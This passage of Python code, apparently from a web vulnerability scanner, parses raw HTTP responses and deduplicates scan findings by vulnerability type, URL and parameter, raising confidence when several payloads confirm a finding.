        import re

        # Handle empty or invalid responses
        if not raw or not raw.strip():
            return {"status": 0, "headers": {}, "body": ""}

        # Try to split headers and body
        # HTTP/2 responses may use \r\n or \n as line separators
        parts = raw.split("\r\n\r\n", 1)
        if len(parts) < 2:
            parts = raw.split("\n\n", 1)

        headers_raw = parts[0] if parts else ""
        body = parts[1] if len(parts) > 1 else ""

        # Extract status code from the first line
        # Match HTTP/1.1 200 OK or HTTP/2 403
        status_match = re.search(r"HTTP/[\d.]+\s+(\d+)", headers_raw)
        if status_match:
            status = int(status_match.group(1))
        else:
            # Try to find status in body (for malformed responses)
            status_match = re.search(r"HTTP/[\d.]+\s+(\d+)", raw)
            status = int(status_match.group(1)) if status_match else 0

        # Parse headers
        headers = {}
        for line in headers_raw.split("\n")[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()

        return {"status": status, "headers": headers, "body": body[:5000]}

    # ─── Deduplication ───────────────────────────────────────────

    def _deduplicate(self, findings: List[dict]) -> List[dict]:
        """
        Deduplicate findings by type + base_url + param.

        Multiple payloads against the same endpoint should collapse into
        one finding entry with all payloads listed.
        """
        from urllib.parse import urlparse, parse_qs

        grouped = {}
        for f in findings:
            # Extract base URL (without query params) and param
            url = f.get("url", "")
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            param = f.get("param", "")
            vuln_type = f.get("type", "")

            key = (vuln_type, base_url, param)

            if key not in grouped:
                grouped[key] = {
                    "finding": f,
                    "payloads": [],
                    "urls": [],
                }
            grouped[key]["payloads"].append(f.get("payload", ""))
            grouped[key]["urls"].append(url)

        # Build deduplicated findings
        deduped = []
        for key, group in grouped.items():
            finding = dict(group["finding"])

            # Update with all payloads
            finding["payloads_tried"] = group["payloads"]
            finding["payload"] = group["payloads"][0]  # Keep first as primary

            # Update URL to be the base URL (first found)
            finding["url"] = group["urls"][0]

            # Boost confidence if multiple payloads confirmed
            # PRESERVE actual response evidence, don't overwrite with summary
            if len(group["payloads"]) > 1:
                finding["confidence"] = min(0.95, finding.get("confidence", 0.5) + 0.1 * (len(group["payloads"]) - 1))
                # Keep original evidence, just add note about payload count
                original_evidence = finding.get("evidence", "")
                if original_evidence and "payload variants" not in original_evidence:
                    finding["evidence"] = f"{original_evidence} (confirmed with {len(group['payloads'])} payload variants)"

            deduped.append(finding)

        return deduped
